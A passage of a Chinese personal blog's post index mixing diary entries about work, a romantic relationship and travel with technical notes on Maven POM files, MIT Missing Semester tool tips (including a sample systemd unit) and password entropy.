我最近发现自己缺乏快速描述所遇到问题的能力，尽管事后我可以总结、提炼，但当问题发生的时候，吞吞吐吐描述问题现象就已经是我的最好表现了。可是解决问题不是击鼓传花，我完全将问题抛给了别人，自己也没落得心里好受。我的直接目的是解决问题，真正得目的是依靠独立解决这一类问题来脱颖而出。当事情超出了我个人能力范围外后，如何做一个很好的问题描述者，第一步是描述我的操作，第二步是描述我尝试过的处理方法，第三步是我对问题和解决思路的可能猜想。万万不能穷忙活、白忙活，这不是态度不态度的问题，我发现理性思考和穷忙活花费相同的时间对我的精神耗能是一样的。也就是说，哪怕我的脑子一直被动的转动，也会让我劳心费神，而对生活和工作节奏缺乏主动性又会进一步对我造成致命伤。 为什么说对生活缺乏主动性会让我心神憔悴？比方说周一到周五要求上班，不得不拖着疲惫身躯去打卡签到跟大不了请个假明天不去上班的心态是完全不同的，上班这个行为取决于我的心情，是我主动上班学习工作上的业务知识处理编程问题，而不是因为缺钱花不得不打卡挣这个钱。因此，一旦我心情不好了，就主动下班，谁也不想理睬。而心情还好时，加班到 8 点也不是不可以。前一段时间，因为贪餐补的缘故，导致我的工作效率也变差了，人跟工作的关系绝不是农夫和驴的关系那么简单，学会让心变得强大而不是提前给它扔个消极定义。注意，我不是在否认任何自由主义的观念，而只是想说，在下定论之前，请 “先尝试一下”。知道和感受到，毕竟是两个不同的概念。看了无数次新西兰的美丽风景，我也不曾被那里的风吹拂过，也不曾闻过那边的花香。 C++ 运算符重载 C++ 和 Java 的哲学确实有所异，体现在函数上是 C++ 要求使用函数的人先检查传入的参数是否满足条件，而 Java 则是让设计这个函数的人去保证。前者体现了对代码的掌控力，后者则强调了易用性。 纵观国内能够影响我生活并给不少人带去快乐的公司，恐怕让米哈游拔头筹是当之无愧了，无论是用户体验还是员工待遇、企业文化上面，他们真的在做让大家开心的东西。坦白说，第一印象就是 “硬蹭” 塞尔达名气的一个手游，可以说很糟糕了。我甚至也在 B 站留言过关于它的差评，尽管我没有玩过原神，也没有玩过塞尔达。后面没有玩，也是因为习惯吧，下意识就避开玩这款游戏了。现在的我依然没有玩过，但我也希望能做一些让大家都轻松些的事情，比如段子、动画、小说等。 梦中的斑驳光影是葡萄蓝缀着日辉。","link":"/2023/07/16/life-diary-23-6/"},{"title":"2024 年 1 月","text":"和她朋友一起喝酒，在伟伟鸭脑壳吃过后结账，hl 和 ysy 争着结账，她爸电话来了，被 1 结账。她急着走，我醉酒不懂，于是她打车准备离开，让我俩分开走。1 在劝我跟着，我说手机在她手里，声音很大，把周围人吓了一跳，我仍不觉。后面 hl 说把途径点设置成我家，但设置成终点变我家了。之后，我们先去她家，然后我回了家，觉得太醉，就发完消息，自己睡了。可是睡不着，又看看有没有回复，没有。 > 大概半夜 3 点醒来，一看她回复时间，隔了 1 个小时。我大概 5 点多才睡过去。第二天照例被爽约，我说好。上午她发来一条小红书，说的一对交往 8 年的情侣，说的 “一直在一起”，我并没有 get 到，说没啥感觉，让她不开心了。后面解释清楚我的想法后，她表示理解。再之后，她说 1 对我印象会不好，因为喝酒我不耿直，小口喝的，而且还吼了她。我其实并不太记得那些细节了，我只觉得醉，我感觉好难受，我觉得很烦，我真的错的这么多吗？第二天我们去打羽毛，交流之后她说因为我喝酒不耿直，所以会让 1 生气，尽管内心对这种酒局陋习颇为不忿，但还是记在了心头。 无论怎么看，怎么解读，怎么分析，结果就是不会改变的东西，我们总是希望从一种超脱得角度去看待已经发生得事情，但这是徒然的。如果穷耗心计去提升概率，也不如活得潇洒，悠然自得。 在生活中尝试 10 次，正面面对自己 90% 失败的可能性，大部分人可能在遭遇了 2-3 次失败后就不再尝试了，但我必须不撞南墙不回头。 现有的观念都可以被瞬间推翻，一切的价值观都是空中楼阁镜花水月，如果没有逻辑性的推导。那么推导？公理又是什么呢，起作用的范畴呢，针对的对象呢，参与度和效用比率呢。 今天提出去酒店，但是被拒绝了，慧琳嘴里念着不喜欢约好日期去像完成任务似的，但我心里觉得这就是一种间接拒绝。我问她是否抗拒性，但她又矢口否认。我心里不开心，但我依然接受了。 11 月 6 日，她喝醉了我生气了，她循环的歌是陈奕迅的心的距离。我要的不只是喜欢，我希望拥抱、亲吻和做爱，我渴望灵魂和肉体全部。 好几天都是陪她自习，然后一起去很远的地方吃好吃的，她乖乖的，我也很喜欢这种状态。 她成绩不好，又只有 5.5，说要报班培训，这样我跟她连自习都不能一块儿了，相处的时间也越来越少，只有晚上一两把金铲铲。打完后扫扫小红书，看到有趣的帖子都 po 给对方分享自己的态度。我发现我自己的状态很不对劲，对她的感觉在潜移默化的改变着。我的时间是有限的，它们需要去到正应该去的地方，而不是在这些无聊事情上浪费掉。","link":"/2024/01/27/life-diary-24-1/"},{"title":"2023 年 7-9 月","text":"人毕竟是群居动物，当你做了一件惹人错愕的事时，群人并不立刻表现，反倒是抬头观望他者或主事者的表情。因为没人希望成为不假思索的配角，聪明结合着奴隶心态成了自缚的缘由。当然，一旦你立刻露怯，食物链下位者的身份立刻暴露无疑，“引蛇出洞” 已是第三层，早已超出通常无意识博弈的范畴。因此，在高度竞争环境中，错误的言行绝对不要承认。 从地铁口出来，穴居人，抬头，蓝天染白云，阳光扑在脸上。 看不见东西的损失，没人负责，也少有人提。 夜已深，我从冰箱拿出无糖可乐倒进早备好的玻璃杯，泡沫和黑色液体三七分明，无数泡泡开始在雾面撞击碎灭。这两月迎来我久违的充实时光，但内心依然满怀对未来的忐忑，脑子里反复告诉自己活在当下，自由快活。耳朵里是伍佰的歌，玩拉瑞安的游戏，没有日常寒暄，只剩一个人的热闹。 我觉得应该加一点英语口头禅，不是简单得语气词比如 “awe” 或者 “fxck it” 这种而是 “I’m ok with it” 更加偏长一些的语句。 八月和九月我基本都沉浸在拉瑞安的游戏世界里，一个博德之门 3，另一个是神界原罪 2。","link":"/2023/10/16/life-diary-23-789/"},{"title":"2024 年 2 月","text":"她之前告诉我朋友介绍的男生都没见过，但是今天突然知道她曾和一个男生相约去看过电影，因为男生比较帅而且主动要了微信。但见面后又嫌弃男生矮个子，就放弃继续交流了，她又说自己不会因为外貌而喜欢上一个人。之前说身边男孩子少，但是和男生喝酒的场合挺多次的，还喝醉过，我该相信哪一句话呢。我需要理性回归，不要再浑浑噩噩，现在的我根本无法解释这一切。而且现在的我又到了万分窘迫的时候了，我慢慢地一步步走吧，从明天开始清醒。我知道她爱我，但她能为了这份感情做到什么地步呢，我好讨厌思考这些，反正都是外源性矛盾，就无视吧。我要努力做到一个人也能好好的。现在凌晨 4 点半了，我感觉脑袋锈锈的，心里空空的，好难受。 昨天下午六点我还在地铁上，没能及时到，第二天凌晨又拖着她聊到 3 点，虽然知道第二天有课。尽管后面她说调到下午了，但是知道我这样子仍然不开心了。我道了歉。 最近我俩有时候会去打台球玩，因为都比较菜所以选择在包间里打，比较安静也可以随便贴贴。玩中式八球的高手可以一杆清台，开局从侧方打散开并且每次出杆都会规划白球的下一个击球点，而我只能靠任意球。很多球的位置比较远，慧琳很会用辅助杆解决麻烦，但我很少用，即使学会用辅助杆会让我球技有进步，我想我下次应该多尝试下。 过年的时候，父母因为做账没法当天回宜宾，所以一家人在成都团了个小年。临近午夜的时候，我和慧琳一起出去买烟花放。去的路线含着绕城高速，那个入口我常常搞混走错道，这次整条街就我们一辆车，慢悠悠进去。深夜的高速黑漆漆的，但由于是过年又临近 12 点，一路都伴着零星的烟花指引着前行。去到烟花贩卖处，130 元的加特林和 380 元的大礼花，我们选了后者，我还砍到了 350。卖家一个劲夸自家烟花好，浏阳进过来的。烟花放完后，我们又把车里的仙女棒也找出来放了一些，没有想象中的浪漫感觉，但是也还不算赖。回去的深夜里，我俩都不想回家，希望能一块儿窝车上。我们一起边听着歌边想象期待着两人的未来，除旧迎新这才是年。 情人节我和慧琳去吃了烤鱼，之前有在万州烤鱼和烤匠之间纠结过，最后还是选择了后者，毕竟已经好些年没尝过了。头天晚上，我们有聊到关于吃鱼，她小时候常被鱼刺卡住，所以尽管很喜欢吃鱼，但吃的频率是很低的。不过她对鱼皮的兴趣寥寥，我感觉很多朋友都不太爱吃动物的皮，包括鸡皮、鱼皮和青蛙这些，有的嫌黏糊糊腥味重，有的嫌小疙瘩吃着恶心。我倒是没怎么在意，只在意它们被咀嚼时传递的口感如何。情人节照例是要送礼的，头天晚上慧琳悄悄打车来到我家楼下，我惊喜着下楼，临见面才晓得是送我情人节礼物 —— 一个手工拼接粘连的打印机。她花了两天时间大约十个小时才拼好，手指上有三块白色的被 502 腐蚀的痕迹。我不知道怎么安抚，只能紧紧握着，其实如果是我自己的手，我应该会全然不在乎的，但喜欢的人总会多少让人揪心。 今天晚上慧琳和别人一起去放烟花，说是要跟着看看闺蜜的男友，一个理工男，我嫌闹就没跟着去。一开始说去兴隆湖但不知道允不允许放，她提议去她老家那边放，最后去了哪里我也没有问。晚上心情一般，想喝点酒但又没有买，也懒得买了，我想人总要学会一个人生活，从孤独中品尝风味。我觉得最近的心烦意乱，大部分都缘于我太闲了。本来我就是快乐的一个人，喜欢上了别人之后，我是木讷的树，你是自由的风。下午我去接她放学，回去的路上，我觉得地铁很吵，但和她一起倒是蛮舒服的。我更喜欢和她一起玩，而不希望有别的人掺和。从什么时候开始的呢，大概是她说补习英语的时候吧，我知道过与不过都差不多的时候，反正也不能留香港。反正一百年前，你不是你我不是我。 2 月 19 日下午和她一起看飞驰人生，大概是心里焦虑论文的事情，导致我心不在焉的。中间也有牵手，手摸到手臂的时候她说痒就收回了。整个氛围都是冷冰冰的，我心情不好，她也是。后面她打车回家，说给我设个途径点，我想陪她回去再自己回来但感觉她心情很坏就顺口答应了。晚上我一直忙论文的事情，她等我到凌晨，最后也只是互道晚安。 第二天早上我和她电话了很久，我感觉她对我突然就冷漠了，后面虽然也说翻篇但我还是能够感受到那种冰冰的氛围，我很不好受。今天阳光正好，去了书店逛逛，然后顺带来富顺卤肉面点了一碗中份的卤肉面和一份豆腐脑，今天很不开心希望这些食物能让我开心一点。我并不觉得她做错了什么，我觉得是我对待感情的方式有问题，两个人互相喜欢不一定就要腻在一起，隔的远远的俩人也能很爱。我就应该让自己冷下来，那颗躁动的无处释放的心，也许并不比一颗安静的心具有更多的价值，或者说在对方看来并没有更宝贵。谁会讨厌成熟、有问必答呢？无处不在的关心有时候近乎于噪声，夏日蝉鸣在风和日丽的下午很浪漫但夜深人静时就挺刺耳的，我应该睡一个月的。 一个男人如果爱上了一个女人，其实是一种悲哀，软肋全遂对方心意，自己的性格也变得软弱颓废，眼里似水柔情将人烤化成一滩烂泥巴。我的问题在于两点，一者是想太多而耽于空想，被恐惧和焦虑所裹挟着，心焦生急，一急就容易钻牛角尖；二者是过于展露自我且过于心态随意了，亲人亦会感到不快，何况恋人。她晚上因为伤心喝了罐啤酒是我最爱的葡萄日本啤酒，后面她等我困了再一起晚安，我听到这里心就一下化了。 下午看热辣滚烫电影，看完后两人在绿茶吃饭，我开始努力破冰，尽量告诉她我的想法和感受。误会解除，我们说了很多很多话，我当时才知道前几天她受的委屈，换位思考一下我这种压力怪真的太讨厌了。顺带一提，就在几天前她还觉得想跟我结婚，但我的一番傻瓜操作直接让她心情糟糕透了。 由于我是在事隔多日之后且二人亲昵度再创新高时写下这段文字的，所以我实在很难还原整个事情的原貌，总之经历这件事情后，我明白了一个新的道理：无论开心、悲伤还是焦虑、尴尬，都尽量跟对方说而不是藏在心里自己消化。对于恋人来说，在消化自我情绪而无暇她的时候，本质上和冷暴力无异。 慧琳的闺蜜有个男朋友，他买了假鞋当作情人节礼物送给了对方，比起昂贵礼物含蓄暗示的未来物质保障，这种小聪明或许比易拉罐戒指更容易让女生感到被侮辱吧。 时隔一个多月后爱爱，二人酣畅淋漓了 4 小时多，算是尽了兴致。又过了两天，我们又玩了一个下午，第二天早上又去了。两人除了灵魂上的契合，性上也是极为合拍，在不过分越矩的情况下我们乐意尝试新的姿势和情趣。经历过后，能明显感受到二人的感情升温，而我也懊恼曾经 DIY 过头。","link":"/2024/02/27/life-diary-24-2/"},{"title":"2024 年 3~5 月","text":"历史并无所谓必然性，领跑者的优势无法维续，成功者的共性又太零散，对历史的总结大多沦为了个人的自我偏见，包括对成功本身的定义也五花八门了起来。但话又说回来，思想匮乏的我，读历史时囫囵，下结论时匆匆，明明百无聊赖却又不细细去读全凭书本作者自圆其说，只求转述时能仿着鹦鹉学舌一番。即使偶尔脑子里蹦出一星半点想法，诸如 “农民起义总伴随屠杀”，也廉价无意义，构不成理论，却依然深信不疑了很久，成了自己最厌恶的经验主义者。 和慧琳分开的日子，我总是惦念着对方，但又很少主动开口。我所渴求的不是无话不谈的朋友关怀，也不是絮叨语音里家长里短，我只想要抱着对方不撒手。心里想，身体也想，分开的日子里我总觉得空落落的。和友人看电影时，心思里也是如果她在就好了，可以拉着手。 我不会去练字、刷力扣或者学英语，从时间投资角度讲，之前的大量投入得到的低效回报和低效响应已经说明我不太适合。我应该尝试一些新的东西，无论是娱乐性还是成长性的，我可以更加关注个人健康和体验类的活动。","link":"/2024/04/27/life-diary-24-3/"},{"title":"2024 年 6 月","text":"去年上半年，除了钱包瘪的速度比较想象中快得多以外，一切都很美好。恋爱产生的巨量多巴胺给我生活拼命加氧，让我嗨到甚至忘记记录生活。我想这是否就是生命真正的意义，沉浸着感受五彩生活而不只是喘气。刚开始本以为这种狂热的状态不会超过三个月，现在都翻了个倍。这段时间其实有很多很有趣的东西值得记录，沙滩、叮叮车、迪斯尼、互见家长、海购、出租师傅等等，不止是两人缠绵，还有过程中遇到有趣的人或事。 坐春秋航空或吉祥航空公司的飞机就好似乘坐以前那种冒黑烟的城乡通运公共汽车，拥挤、颠簸乃至于生理不适。我的假性中耳炎会在飞机起飞降落时发作，乘坐于前者尤为不适，过程相当煎熬，而后者只是轻微耳鸣。之前也曾尝试过换一种交通方式，但高铁的漫长旅程即使买一等座也让我在浑身不舒服、坐立难耐。 在友人种草下，尝试了小学课本就有的磁悬浮列车，2 号线过去浦东机场大概要 50 分钟，但磁悬浮只要 6 分钟，时速大部分时间在 300km/h。不过车身很晃，而且时而左偏时而右偏，我不知道这是磁悬浮列车本身的特点还是因为晚上光线不好看岔了。说起来，以前实习上班的时候每天都过龙阳路站两次却从没留意到磁悬浮列车也在这里，再联想到 F1 赛车和上海迪斯尼明明就在附近但我这三年也从未踏足，不禁唏嘘。不同阶层的人眼中的上海会折射出不一样的光彩，我不是错过了而是被急流裹挟着。 中午吃的鳗鱼饭，名字叫鳗炉家・西塔泥炉烤肉。店名字和一个西塔老太太烤肉店很像，后者属于江浙沪一带的童年回忆经典餐馆了，我一个四川人甚至没听说过，下次要打卡一下。这个鳗鱼店里面有韩文，但烤肉又是东北那边的做法，名字又有蹭流量之嫌，属实是大杂烩。心鎏买的四人团，中间的饭挺好吃，但是鳗鱼一般，我就会蘸海盐裹上海苔一口闷。那个包饭不知道怎么配，途中尝试用手还给烫了一下。 毕业典礼是 6 月 13 号下午，我提前一天乘飞机再次到达上海，慧琳陪着我一路，包括忙签字、扫描和递交材料这些。由于各种截止时间都赶一块儿了，加上毕业论文写的让老师不满，内心满是忐忑焦躁。幸好，最后都顺利完成。 前几天下载了一款喵喵记账的 APP，里面有个功能是后敲 Iphone 两下，就可以借助苹果快捷指令截屏并召唤记账软件解析账单。我以前也尝试过一些记账软件或者干脆手打，但后面都因为维续的时间成本过高，而一旦漏掉一两天就很难继续维系。但是价格不太美丽加上有很多乱七八糟的 UI 和广告，我看了一下 B 站和油管上的教学视频，原理都是苹果截图 OCR 然后将账目传给云端，但部署都很麻烦，而且也不美观。之后，我又去闲鱼上花了六毛买了个 Excel 自动化记账表格，打开后被里面琳琅满目需要手动填写的格子吓到，迅速关闭。最后我的解决方法是，就手打随意记账然后扔给 AI 让它帮我总结和统计。 晚上和慧琳重温了一下博德之门 3，她都快忘记怎么操作了，但还是乐呵呵跟着我一路捡东西。后面我也没有强让她陪着，吃完饭后就网上冲浪了。我主要是将我的 ShareX 的上传设置成了 Google Photos。另外，我看到了一款由高中生设计的字体 “润”，挺可爱的画风，想着可以用到我已经夭折的贪吃蛇界面里。其借鉴的得意黑字体也很棒，内心也尤为佩服。","link":"/2024/06/26/life-diary-24-6/"},{"title":"2024 年 7 月","text":"玩博客和搞技术都需要一颗 DIY 内核，我决定以后的文章封面图都用我拍摄的照片，并在文章开头介绍一下图片背景。前段时间我在 B 站和小红书上 “抄” 了一些公式化地拍摄构图，效果还是有的，至少给慧琳拍照的时候不会被抱怨了。比如，构图尽量用九宫格，如果拍全身照就用 1 倍焦距并且将人脸放中间，这样脸不会变形还可以拉长腿部。注意不要贴死底部，余些空间显露一点层次感。如果是半身照就用 2.5 倍焦距，人眼平齐 1/3 线。如果拍侧身照，就放置在左下四格子，尽量舒展开身体，让其自然延申。除了人像外，我还想尝试街头拍摄，希望能留住旅行和生活中的痕迹，给回忆提供一点参考线索。初步的设想是抓住镜头中的故事感，在去掉周围杂物后，突显主题元素，无论是对立冲突还是水乳交融的都行。 不够清晰的头脑就没办法准确地描述心情和想法，说的话、写的字也是散乱的，毫无力量和美可言。当务之急是多阅读多思考，以及勤写作。为此，我购了两本杂志 ——《第一财经》和《哈佛商业评论》，希望物有所值。 不知道从什么时候开始，在某些时刻或者时间段，我就算什么都没有做，也会觉得身心俱疲。不过转念一想，或许正是因为行动的失位，带出了我潜意识里潜藏的焦虑和纠结。和体力消耗不同，精神力的消耗更多是由负面情绪的积攒引起，一旦到达上限，人就立刻断电，RAP 也无能为力。解法也很简单，我尝试用 “不聪明” 的方式去做事情，它可能很慢很绕，但至少进度条在慢慢涨，这能让我情绪变得稳定。 七月里，太阳下山的格外晚人。人在兴隆湖边顶着晃眼的光朝对岸望去，在未完工的大楼上是一大团白云在蓝天里荡漾。这分明是正午的光景，但抬手看表却已是 7 点。等到夜幕真正降临已是快 9 点，蚊虫也逐渐变得肆意起来。我新买的驱蚊液作用微乎其微，躺在草地上被这些飞来飞去的家伙扰的心烦。另一边，女友手臂、大腿上全是鼓起的包，提前喷过六神花露水也未能幸免。 人最宝贵就在时间，而时间最好的去处便是心满意足。因此，时间浪费掉不可怕，漫无目的地挥洒才最为致命。相比于书报文章，我更容易沉浸在现代媒体如小红书、知乎等信息快餐中。待到时间悄悄流干，我才恍然惊觉。若光是费时间也罢了，还费精神，每次刷完这些软件总要晕一阵子脑袋，得缓一会儿才恢复。明明什么也没做，反而人累得发慌，出于无聊的消遣，反让身心都遭罪。 西昌当地有特色的火盆烧烤，我们晚上去的是李小肠总店。整个院子古色古香，亭台楼阁绕着假山流水散落着，而我们选的位置靠着水车。第二天，租了一个电动车，风吹着，很舒服。绕着邛海转了一圈。乘缆车去泸山，我恐高，死死抓着。后面去了光福寺，弥勒佛。下山坐的推车。去金鳞沙滩，人很多，吃了凉山汉堡，原来是土豆夹辣椒，狠辣。去银鳞沙滩，人少些，沙子很白。 跟我一起新入职的同事里，有个叫 “河流” 的，他走路的时候总是昂着头乐呵呵笑着。有时候，我挺羡慕这种简单的自信。年底要开始买房子了，看来看去，我觉得 250 左右的房子就是我的上限了，而为了减轻经济风险我应该尽量朝 190-200 靠拢，再低就品质更差了。 我陷入了一种迷醉的状态，内心极度低沉，然而整体又在清醒的迈步向前。做事情不应该图做的漂亮，然后奔着讲师的身份娓娓道来，而是应该做的快，然后可复用，尽量让自己舒服。","link":"/2024/07/26/life-diary-24-7/"},{"title":"Maven 结构解析","text":"本文将简单介绍如何解析 Maven 的 目录结构和 POM 文件结构。 目录结构 Maven 有一套默认的目录结构，这篇 文章已经总结的很好了，我们当然不用硬记住每一项的名字用处，因为这本身就是约定俗成的。程序员最喜欢打破常规，即使是键盘也要自定义映射整成全平台统一。不过如果真有厂商 ALL IN ONE 了，我们又会出于安全考虑 DIY 一份。当然我也知道为了方便大家理解，名字就是用处，但是也有例外，比如 it 表示集成测试，这个我真是第一次见。言归正传，总之就是不要硬背了，但至少要明白 target、src/main/java 和 src/test/java。 POM 结构 Maven 更重要的是配 POM（Project Object Model）文件，它利用 XML 将项目的依赖项、构建方式、开发者信息等组织起来。其中，最重要的属性是 groupId、artifactId 和 version。 不同 POM 文件之间的组织关系可以分为项目聚合和项目继承两类，也就是说两个 POM 之间既可以分上下级（父子关系），也可以并列（聚合模块）。 继承关系示例代码 com.mycompany.app:my-module:1 的 POM 文件 1234567891011&lt;project&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;com.mycompany.app&lt;/groupId&gt; &lt;artifactId&gt;my-app&lt;/artifactId&gt; &lt;version&gt;1&lt;/version&gt; &lt;/parent&gt; &lt;groupId&gt;com.mycompany.app&lt;/groupId&gt; &lt;artifactId&gt;my-module&lt;/artifactId&gt; &lt;version&gt;1&lt;/version&gt;&lt;/project&gt; 如果和父 POM 的版本、组织绑定，那 com.mycompany.app:my-module:1 的 POM 文件也可以简写为 123456789&lt;project&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;com.mycompany.app&lt;/groupId&gt; &lt;artifactId&gt;my-app&lt;/artifactId&gt; &lt;version&gt;1&lt;/version&gt; &lt;/parent&gt; &lt;artifactId&gt;my-module&lt;/artifactId&gt;&lt;/project&gt; com.mycompany.app:my-app:1 的 POM 文件 123456&lt;project&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.mycompany.app&lt;/groupId&gt; &lt;artifactId&gt;my-app&lt;/artifactId&gt; &lt;version&gt;1&lt;/version&gt;&lt;/project&gt; 聚集关系示例代码 com.mycompany.app:my-module:1 的 POM 文件 123456&lt;project&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.mycompany.app&lt;/groupId&gt; &lt;artifactId&gt;my-module&lt;/artifactId&gt; &lt;version&gt;1&lt;/version&gt;&lt;/project&gt; com.mycompany.app:my-app:1 的 POM 文件 12345678910&lt;project&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.mycompany.app&lt;/groupId&gt; &lt;artifactId&gt;my-app&lt;/artifactId&gt; &lt;version&gt;1&lt;/version&gt; &lt;packaging&gt;pom&lt;/packaging&gt; &lt;modules&gt; &lt;module&gt;my-module&lt;/module&gt; &lt;/modules&gt;&lt;/project&gt; 同时整合聚集和继承 com.mycompany.app:my-app:1 的 POM 12345678910&lt;project&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.mycompany.app&lt;/groupId&gt; &lt;artifactId&gt;my-app&lt;/artifactId&gt; &lt;version&gt;1&lt;/version&gt; &lt;packaging&gt;pom&lt;/packaging&gt; &lt;modules&gt; &lt;module&gt;../my-module&lt;/module&gt; &lt;/modules&gt;&lt;/project&gt; com.mycompany.app:my-module:1 的 POM 12345678910&lt;project&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;com.mycompany.app&lt;/groupId&gt; &lt;artifactId&gt;my-app&lt;/artifactId&gt; &lt;version&gt;1&lt;/version&gt; &lt;relativePath&gt;../parent/pom.xml&lt;/relativePath&gt; &lt;/parent&gt; &lt;artifactId&gt;my-module&lt;/artifactId&gt;&lt;/project&gt; 项目插值 项目插值可以通过形如 ${variable} 来引用某个变量的值，减少代码冗余。这里的变量又分三类，一种很好理解，就是 xml 标签对应的值，比如 ${project.groupId}、 ${project.version}、 ${project.build.sourceDirectory} 等。第二种是 Properties，需要我们自己定义，比如： 1234567891011121314151617181920&lt;project&gt; ... &lt;properties&gt; &lt;mavenVersion&gt;3.0&lt;/mavenVersion&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.maven&lt;/groupId&gt; &lt;artifactId&gt;maven-artifact&lt;/artifactId&gt; &lt;version&gt;${mavenVersion}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.maven&lt;/groupId&gt; &lt;artifactId&gt;maven-core&lt;/artifactId&gt; &lt;version&gt;${mavenVersion}&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; ...&lt;/project&gt; 第三种是特殊变量，包括： project.basedir 当前项目所在的目录。 project.baseUri 当前项目所在的目录，表示为 URI maven.build.timestamp 表示构建开始时的时间戳（使用协调世界时 UTC）。 我们甚至可以利用 Properties 指定 maven.build.timestamp 的格式： 1234567&lt;project&gt; ... &lt;properties&gt; &lt;maven.build.timestamp.format&gt;yyyy-MM-dd'T'HH:mm:ss'Z'&lt;/maven.build.timestamp.format&gt; &lt;/properties&gt; ...&lt;/project&gt; 参考 【1】Introduction to the POM 【2】Maven 学习 - 目录结构","link":"/2023/05/28/maven-structure/"},{"title":"MIT 6.Null 大杂烩","text":"本篇大杂烩包括键盘重映射、守护进程、FUSE、备份、APIs、命令行模板、窗口管理器、VPNs、Markdown 等。 键盘映射 键盘映射有助于我们在不同系统之间无缝切换，这对程序员来说尤其便利，比如我就常常在 Command 在 Windows 上对应着 Ctrl 还是 Alt 上纠结。坦诚说，我到现在也没有对键盘进行重映射，一个直接理由是：我担心看不懂网络上地快捷键指南了。 一些常用的映射配置： Capslock -&gt; Ctrl or Esc 这对洋人来说是个低频键，但对中国人来说其实在 macOS 上蛮常用来切换中英文的 PtrSc -&gt; Play/Pause Ctrl -&gt; Meta（Win 或者 Command） 一些自定义组合键事件： 打开一个新网页或者终端 插入一个特别的文本，比如邮箱或者 ID 不同系统会各自有优秀的重映射软件： macOS Karabiner-Elements，skhd Linux xmodmap，Autokey Windows 内置控制面板，AutoHotKey，SharpKeys 守护进程 守护进程 daemons 本质上就是躲在计算机后台偷偷运行的程序，当然这种说法是非贬义的，毕竟系统进程也是守护进程。通常来说，它们名字都会跟着一个名叫 “d” 的尾巴，比如在 sshd 或者 systemd。 这里提到的 systemd 是 Linux 用来管理守护进程的配置和运行的，你可以输入 systemctl status 来列出当前正在运行的守护进程。我们可以利用 systemctl 去启用 enable，禁用 disable，开启 start，暂停 stop，重启 restart 或者检查 status 服务状态，这些都是很常用的系统命令，不求记住但至少混个脸熟啊，可别 “天天打照面，次次都脸盲” 了。 如果你想_配置你自己的守护进程_，也可以通过 systemd 提供的接口设置。这里是一个自定义 Python 程序的示范： 1234567891011121314# /etc/systemd/system/myapp.service[Unit]Description=My Custom AppAfter=network.target[Service]User=fooGroup=fooWorkingDirectory=/home/foo/projects/mydaemonExecStart=/usr/bin/local/python3.7 app.pyRestart=on-failure[Install]WantedBy=multi-user.target FUSE FUSE 是用户空间文件系统的英文缩写，简单来说就是以一个用户身份自己设计实现一个文件系统，当然本质上是在调用操作系统内核文件相关的系统调用命令。不过，出于安全方面的考虑，UNIX 并不支持 FUSE。 可能你会好奇，系统自带的文件系统挺好的，我干嘛要重新设计一个呢？下面有一些例子，可以参考： sshfs 通过 ssh 在本地打开远程节点的文件 rclone 安装 Dropbox、GDrive、Amazon S3 或 Google Cloud Storage 等云存储服务并在本地打开数据 gocryptfs 加密覆盖系统，它的文件和文件夹都是加密过的，然后通过这个系统明文访问，具体细节可以看官网演示 kbfs 端到端加密的文件系统 borgbackup 备份 备份 backups 这个概念应当和副本 copy 区别开，上传到云盘也不算备份，尽管 Google Drive 和 Dropbox 很方便，但当数据被破坏时，它们也会把错误同步。 可以参考 2019 年 missing 的备份话题章节 APIs 很多在线服务都提供 API 接口供用户访问，我做过不少 Web 服务，这里不再赘述了。有的 API 需要权限，可以通过 OAuth 扮演特定角色去访问。 命令行模板 如果你对命令一无所知，也可以使用 man 命令直接查看对应程序的使用手册。但大部分程序在设置 flag 时都遵循某些约定俗成的规则： --help 简略版的使用说明 --version 或者 -V 版本号 --verbose 或者 -v 打印输出，有的程序支持 -vvv，v 越多打印语句越详细 --quite 只打印错误信息 -r 通常来说具有破坏性的命令（比如删除）是不递归的，需要你手动指定递归标志 VPNs 中国有防火墙的存在，所以我们经常通过 VPNs 的访问方式来与外网通信。但实际上在正常的网络访问中，“机场” 和 ISP 本身没什么区别，它们都能够截获你的流量和日志，但是你的通信内容是被 https 保护的。所以在使用 VPNs 时，我们只需要关心网络质量即可。 Hammerspoon Hammerspoon 是 macOS 的桌面自动化框架，它允许你编写挂接到操作系统功能的 Lua 脚本，从而和键盘、鼠标、窗口、显示器、文件系统等进行交互。 Docker, Vagrant, Cloud Vagrant 允许你用代码对虚拟机配置进行描述，包括操作系统、服务和包等，然后键入 vagrant up 就能将虚拟机实例化。Docker 在概念上类似，但它使用轻量级容器而不是虚拟机。 你也可以在云端租用虚拟机，它有如下好处： 永远在线的公网 IP 机器可自由配置资源 以便宜的价格同时持有多台机器（比如一千台） GitHub 在 GitHub，你有两种方式参与到开源项目中： 提 issue，一般是报错和请求新特性，甚至都不需要你去读代码。 提 pull request，你可以 fork 某个项目到本地，新建一个分支，然后修 bug 或者实现一个新特性，最后创建一个 pull request，项目管理员会审核你的补丁，如果通过会加入到主干上。通常来说，大型项目都有贡献指南，标记那些对初学者较友好的 issue，有的甚至有指导计划来引导初学者。","link":"/2023/05/07/mit-6-null-potpourri/"},{"title":"MIT 6.Null 安全和密码学","text":"标题很唬人，但实际上我们并不需要去学习如何设计安全系统或密码协议，而只需要理解和实际编程相关的东西，比如在 Git 中使用 Hash 函数或在 SSH 中使用 KDF 和对称非对称加密，密码学突然就接地气了。 熵 Entropy 想要保证计算机安全，就需要高强度的密码，让别人猜不着。但是什么才算高强度的密码呢？答案是香农熵。香农熵常用来测量随机性，而_随机性越高的密码强度也更高_。 正如上面 XKCD 漫画所描述的那样，密码强度这个概念可能有点反直觉，因为人们通常会将 “高强度密码” 同 “人类难记住的密码” 相混淆。那些用古诗去切换密码并洋洋得意的人，比如 2Ghymcl-1Hblsqt，甚至不少是计算机专家。 